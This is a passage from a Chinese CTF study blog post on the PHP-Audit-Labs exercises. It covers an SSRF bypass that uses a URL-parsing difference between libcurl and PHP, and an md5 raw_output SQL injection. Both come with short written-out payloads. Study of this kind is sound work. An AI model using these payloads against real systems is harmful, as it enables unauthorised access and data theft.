class="string">"HRCTF&#123;SSRF_can_give_you_flag&#125;"</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"You IP is &#123;$rip&#125; not 127.0.0.1"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个应该就是当初郁师傅经典ssrf的原型了。要求从内网ip 127.0.0.1访问flag.php才能得到flag.使用的自然是当初blackhatpdf中分享的关于php及curl间对url解析的差异</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;foo@localhost:80@www.bycsec.top&#x2F;flag.php</span><br></pre></td></tr></table></figure>
+
+<p>libcurl认第一个<code>@</code>后的作为host。php及其他语言都认最后一个<code>@</code>后的作为host.所以前面绕过内网ip限制。在后面成功执行了curl</p>
+<h2 id="Day17"><a href="#Day17" class="headerlink" title="Day17"></a>Day17</h2><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/18.png" alt></p>
+<h2 id="md5-raw-output-true"><a href="#md5-raw-output-true" class="headerlink" title="md5 raw_output = true"></a>md5 raw_output = true</h2><p>这其实是一个很经典的漏洞 =&gt; 如果提到 ffifdyop应该就很熟悉了。传说中的万能密码绕过。 而之所以存在这个绕过的原因是md5这个函数第二个选项就是<code>raw_output</code>。默认为false。但是假如设为true的话MD5报文摘要将以16字节长度的原始二进制格式返回。这样就会存在一些奇怪的字符。因此 ffifdyop 在经过md5后的内容恰好是<code>&#39;or&#39;6\xc9]\x99</code>.符合万能密码的要求。</p>
+<p>本题也是同样的道理。<code>addslashes</code>看似不能绕过。但是因为拼接的是md5后的pass.所以只要找到一个数字md5后的raw内容包含<code>\</code>即可。</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user&#x3D; OR 1&#x3D;1#&amp;passwd&#x3D;128</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>时隔两个月终于又把auditlabs的坑填完了…… 不得不说里面涵盖的很多php相关漏洞都是些新手刚刚入门平台里的那些经典题目的原理。当初有的半懂不懂，现在算是把坑给填上了。</p>
+<p>然后自己最近有些纠结。原本因为接触了一些国际赛后，开始投身nodejs与python相关的漏洞了。出了几道题也都只是node跟python.唯一一道php还是sql注入。可能自己心里对php还是谈不上喜欢吧，没有钻研细节的劲头，更没有进行相关开发的想法。但最近头一次实战发现php仍旧是网站大头之一,并且ctf比赛中php还是有着能够难倒人的绝对水准。假如我想要继续提升实力，仍旧得在php下下不少功夫。更何况看框架的洞已经算最近的一大乐趣了233.</p>
+<p>所以说,希望自己还是能花点时间去多看看php.找时间练练手。最后能多出几个题就好了。</p>
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+          
+        
+          
+            <p>本文永久链接是：<a href=https://www.bycsec.top/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/>https://www.bycsec.top/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-08-04T19:41:04+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Aug 4, 2020</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/WEB/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>WEB</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/PHP/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>PHP</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/2020/05/04/De1CTF2020writeup/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>De1CTF2020</p>
+                <p class='content'>终于到第二次XCTF了。没想到De1ta的题这次这么顶，果然是出给国际队伍的难度。(膜一波国内外大佬队伍)小绿草这次也就我们大二的几个在打，大家基本都自闭了。WEB自己也只做出两道题，说实话要是...</p>
+              </a>
+            
+            
+              <a class='next' href='/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/'>
+                <p class='title'>学习笔记-Nodejs相关<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>打算写写Node里面最近遇到的知识了。主要还是跟周末的虎符有关吧。作为二队打的,学校虽如期进入线下,但是自己这次还是有点小难受。刷了这么多题了,结果碰到两道并不算擅长的Node题目。只做出来第一...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    <!-- 显示推荐文章和评论 -->
+
+
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      
+      
+      
+      
+      
+        <section id="comments">
+          <div id="valine_container" class="valine_thread">
+            <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+          </div>
+        </section>
+      
+      
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+
+  <script>
+    window.subData = {
+      title: 'PHP-Audit-Labs审计学习',
+      tools: true
+    }
+  </script>
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+  <section class="widget toc-wrapper shadow desktop mobile">
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Day1"><span class="toc-text">Day1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#in-array"><span class="toc-text">in_array()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#练习"><span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day2"><span class="toc-text">Day2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#filter-var"><span class="toc-text">filter_var()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#练习-1"><span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day3"><span class="toc-text">Day3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#class-exists-amp-amp-内部类xxe"><span class="toc-text">class_exists()&amp;&amp;内部类xxe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#练习-2"><span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day4"><span class="toc-text">Day4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#str-pos-错误使用"><span class="toc-text">str_pos()错误使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#练习-3"><span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day5"><span class="toc-text">Day5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#escapeshellcmd-escapeshellarg"><span class="toc-text">escapeshellcmd()+escapeshellarg()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#练习-4"><span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day6"><span class="toc-text">Day6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#正则不当导致路径穿越"><span class="toc-text">正则不当导致路径穿越</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#练习-5"><span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day7"><span class="toc-text">Day7</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#parse-str-变量覆盖"><span class="toc-text">parse_str()变量覆盖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#练习-6"><span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day8"><span class="toc-text">Day8</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#preg-replace"><span class="toc-text">preg_replace</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#练习-7"><span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day9"><span class="toc-text">Day9</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#str-replace-过滤不当"><span class="toc-text">str_replace()过滤不当</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#练习-8"><span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day10"><span class="toc-text">Day10</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#程序判错未exit"><span class="toc-text">程序判错未exit()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#练习-9"><span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day11"><span class="toc-text">Day11</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php反序列化"><span class="toc-text">php反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#练习-10"><span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day12"><span class="toc-text">Day12</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#htmlentities-处理不全"><span class="toc-text">htmlentities()处理不全</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#练习-11"><span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day13"><span class="toc-text">Day13</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#waf失效进行sql注入"><span class="toc-text">waf失效进行sql注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#练习-12"><span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day14"><span class="toc-text">Day14</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#变量覆盖-路径穿越"><span class="toc-text">变量覆盖+路径穿越</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day15"><span class="toc-text">Day15</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-SELF"><span class="toc-text">PHP_SELF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#练习-13"><span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day16"><span class="toc-text">Day16</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#REQUEST"><span class="toc-text">$_REQUEST</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#练习-14"><span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day17"><span class="toc-text">Day17</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#md5-raw-output-true"><span class="toc-text">md5 raw_output &#x3D; true</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#summary"><span class="toc-text">summary</span></a></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <div class="aplayer-container">
+          
+
+
+        </div>
+      
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:895531613@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/baiyecha404"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+        </div>
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="bycsec.top">Copyright © 2020 byc_404</a></p>
+
+        </div>
+      
+    
+      
+        <a href="https://bycsec.top/" target="_blank" class="codename">IGNITE</a>
+        , total visits
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          times
+        
+      
+    
+  </footer>
+
+<script>setLoadingBarProgress(80);</script>
+
+
+      <script>setLoadingBarProgress(60);</script>
+    </div>
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4/dist/jquery.min.js"></script>
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+  <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+  <script src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    $(function() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '8px',
+        duration: '800',
+        interval: '100',
+        scale: '1'
+      });
+    });
+  </script>
+
+
+  
+<script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function() {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+  <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js"></script>
+
+
+
+  
+  
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/BBC19066-E176-47C2-9D22-48C81EE5DF6B.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/B18FCBB3-67FD-48CC-B4F3-457BA145F17A.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/00E0F0ED-9F1C-407A-9AA6-545649D919F4.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/67239FBB-E15D-4F4F-8EE8-0F1C9F3C4E7C.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/B951AE18-D431-417F-B3FE-A382403FF21B.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/2884F904-F1F3-479E-AE27-5EBC291B63B0.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/landscape/250662D4-5A21-4AAA-BB63-CD25CF97CFF1.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('') {
+          $('').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4/dist/Valine.min.js"></script>
+
+  
+  <script>
+  var GUEST_INFO = ['nick','mail','link'];
+  var meta = 'nick,mail,link'.split(',').filter(function(item){
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick','mail','link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function(item){
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+  var valine = new Valine();
+  function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+  }
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+  valine.init({
+    el: '#valine_container',
+    meta: meta,
+    
+    appId: "pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz",
+    appKey: "9HlyBGu0qm9EmkSNKD2qoBx4",
+    placeholder: "快来评论吧~",
+    pageSize:'10',
+    avatar:'robohash',
+    lang:'zh-cn',
+    visitor: 'true',
+    highlight: 'true',
+    mathJax: 'false',
+    enableQQ: 'true',
+    requiredFields: requiredFields,
+    emojiCDN: 'https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/emoji/valine/',
+    emojiMaps: emojiMaps
+  })
+  </script>
+
+
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/js/app.js"></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/js/search.js"></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/comment_typing.js"></script>
+
+
+
+
+
+
+<!-- 复制 -->
+
+  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('fa-copy');
+        $icon.addClass('fa-check-circle');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('fa-check-circle');
+          $icon.addClass('fa-copy');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('fa-copy');
+        $icon.addClass('fa-times-circle');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('fa-times-circle');
+          $icon.addClass('fa-copy');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+
+
+<!-- fancybox -->
+
+  <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+<script>
+  let LAZY_LOAD_IMAGE = "";
+  $(".article-entry").find("div.fancybox").find("img").each(function () {
+      var element = document.createElement("a");
+      $(element).attr("data-fancybox", "gallery");
+      $(element).attr("href", $(this).attr("src"));
+      /* 图片采用懒加载处理时,
+       * 一般图片标签内会有个属性名来存放图片的真实地址，比如 data-original,
+       * 那么此处将原本的属性名src替换为对应属性名data-original,
+       * 修改如下
+       */
+       if (LAZY_LOAD_IMAGE) {
+         $(element).attr("href", $(this).attr("data-original"));
+       }
+      $(this).wrap(element);
+  });
+</script>
+
+
+
+
+
+
+  <script>setLoadingBarProgress(100);</script>
+</body>
+</html>
